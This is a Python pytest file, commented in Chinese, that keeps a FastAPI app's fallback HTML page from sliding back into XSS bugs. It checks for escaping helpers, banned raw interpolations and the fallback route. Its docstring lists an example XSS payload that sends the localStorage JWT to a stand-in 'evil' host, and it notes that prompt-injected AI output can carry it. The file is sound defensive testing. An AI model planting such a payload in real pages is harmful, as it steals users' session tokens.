"""回退页（`app/static/index.html`）的 XSS 守卫。

## 这个页面是什么

没有前端构建产物时，`app/main.py` 会伺服这份手写页面 —— 它是**打包版的兜底界面**，
所以不能引入 DOMPurify（那是给构建产物用的，给兜底页塞依赖只会让它更难维护）。

## 为什么必须守

同一份页面把 JWT 存在 `localStorage`，而它渲染的三类字符串全都不可信：

| 来源 | 谁能控制 | 典型 payload |
|---|---|---|
| 岗位标题 / 公司名 / 城市 | 爬虫抓来的第三方页面 | `<img src=x onerror=fetch('//evil/'+localStorage.token)>` |
| AI 回答（SSE 逐片拼接） | 模型输出，可被提示词注入 | 同上 |
| 搜索框内容（回显到对话） | 用户自己，但反射型一样能打 | 同上 |

一次成功注入 = 令牌被读走 = 结合「默认密钥」直接接管。

## 这里锁的是「不许改回去」

实现改成 `textContent` 或转义都能过，但**只要有人把某处恢复成裸插值，就必须红**。
所以断言写成「危险模式一条都不许出现」，而不是「esc 函数存在」——后者太容易满足。
"""
from pathlib import Path
import re

import pytest

PAGE = Path(__file__).resolve().parent.parent / "app" / "static" / "index.html"

#: 整行注释（`// ...`）。只认行首，避免把 `'http://...'` 里的 `//` 当成注释切掉。
_LINE_COMMENT = re.compile(r"^\s*//")
_BLOCK_COMMENT = re.compile(r"/\*.*?\*/", re.S)


@pytest.fixture(scope="module")
def page() -> str:
    assert PAGE.exists(), f"回退页不见了：{PAGE}"
    return PAGE.read_text(encoding="utf-8")


@pytest.fixture(scope="module")
def code(page) -> str:
    """去掉注释后的代码。

    ⚠️ 这一步是必要的，不是偷懒：注释里会写「原来这里是 `innerHTML += data`」来解释
    为什么改 —— 那恰恰会把守卫顶红。**判据只能看实际会被执行的代码**，
    否则注释写得越清楚，测试越容易假红，最后人会去删断言。
    """
    without_block = _BLOCK_COMMENT.sub("", page)
    lines = [ln for ln in without_block.splitlines() if not _LINE_COMMENT.match(ln)]
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# 转义工具必须在
# ---------------------------------------------------------------------------

def test_页面提供转义函数(page):
    assert "function esc(" in page
    assert "ESC_MAP" in page
    # 五个必须覆盖的字符，少一个都能绕过
    for ch in ("&amp;", "&lt;", "&gt;", "&quot;", "&#39;"):
        assert ch in page, f"转义表缺少 {ch}"


def test_保留换行的纯文本转义存在(page):
    """AI 流式输出要保留换行，所以单独有 escText。"""
    assert "function escText(" in page
    assert "<br>" in page


# ---------------------------------------------------------------------------
# 危险模式：一条都不许回来
# ---------------------------------------------------------------------------

#: 这些是「直接把接口/用户数据拼进 innerHTML」的原始形态。
#: 每条都对应一次真实的注入面，不是凭空列举。
FORBIDDEN = [
    "${job.title}",
    "${job.company_name}",
    "${job.city}",
    "${job.experience}",
    "${job.education}",
    "${job.id}",
    "${d.name}",
    "${message}",
    "innerHTML += data",
]


@pytest.mark.parametrize("pattern", FORBIDDEN)
def test_危险插值不得出现(code, pattern):
    assert pattern not in code, (
        f"发现未转义的插值 {pattern!r}：接口/用户数据直接拼进 innerHTML。"
        f"改成 esc(...)（纯文本多行用 escText(...)）。"
    )


def find_unsafe(text: str) -> list:
    """返回命中的危险模式。抽成函数是为了能单独验证判据本身有效。"""
    return [p for p in FORBIDDEN if p in text]


def test_判据本身能抓到坏样本():
    """证明上面的 FORBIDDEN 列表不是摆设。

    这里刻意**不去改 `app/static/index.html` 做反向验证**：一是那等于临时削弱
    生产文件的防护（安全策略会拦，拦得对），二是测试不该为了证明自己而破坏被测对象。
    用一段人造坏样本验证判据，同样能证明「它真的会红」。
    """
    bad = '<td class="py-3">${job.title}</td>'
    assert find_unsafe(bad) == ["${job.title}"]

    good = '<td class="py-3">${esc(job.title)}</td>'
    assert find_unsafe(good) == []

    # 注释里的人话不该触发（`code` fixture 已经剥掉注释，这里验证剥离是有效的）
    annotated = "// 原来写的是 ${job.title}\n" + good
    stripped = "\n".join(
        ln for ln in annotated.splitlines() if not _LINE_COMMENT.match(ln)
    )
    assert find_unsafe(stripped) == []


# ---------------------------------------------------------------------------
# 安全写法必须在（防止有人"简化"掉）
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "pattern",
    [
        "esc(job.title)",
        "esc(job.company_name)",
        "esc(message)",
        "escText(data)",
    ],
)
def test_关键位置已转义(page, pattern):
    assert pattern in page, f"关键渲染位置缺少转义：{pattern}"


# ---------------------------------------------------------------------------
# 端到端：回退分支真的会伺服这一版页面
# ---------------------------------------------------------------------------

def test_没有构建产物时根路径返回兜底页(monkeypatch):
    """把「找前端构建产物」强制成 None，确认回退分支伺服的就是这份页面。

    为什么需要这条：开发机上 `frontend/dist` 存在，根路径返回的是 Vite 构建版
    （它有自己的 `sanitize.ts` 防护）。手写兜底页只在**没有构建产物**时才生效 ——
    打包版没带 `frontend_dist`、或构建失败时。不模拟这个条件，
    上面的内容断言就只证明"文件里有 esc"，不证明"它真的会被送到浏览器"。

    ⚠️ **刻意不进 `with TestClient(...)` 上下文**：进入上下文会触发 lifespan，
    也就是启动 APScheduler、建表、初始化管理员。那会把全局调度器状态留下来，
    后面的 `test_report_notify` 就会撞上「Event loop is closed」——
    一个只读页面的测试不该有这个副作用。不跑 lifespan 也足够验证静态路由。
    """
    from fastapi.testclient import TestClient

    from app import main as main_module

    monkeypatch.setattr(main_module, "_resolve_frontend_index", lambda: None)

    client = TestClient(main_module.create_app())
    resp = client.get("/")

    assert resp.status_code == 200
    body = resp.text
    assert "function esc(" in body, "回退分支返回的不是修好的那一版页面"
    assert "esc(job.title)" in body
    assert "${job.title}" not in body


def test_回退索引指向被修的这份文件():
    """再锁一层：`_resolve_static_index()` 必须解析到 `app/static/index.html`。

    上面那条验证"返回内容对不对"，这条验证"喂的是哪个文件"。
    分开写是因为它们会分别被破坏：有人加了别的兜底页、或改了查找顺序。
    """
    from app import main as main_module

    resolved = main_module._resolve_static_index()
    assert resolved is not None, "回退索引解析失败，根路径会退化成硬编码路径"
    assert resolved.resolve() == PAGE.resolve()
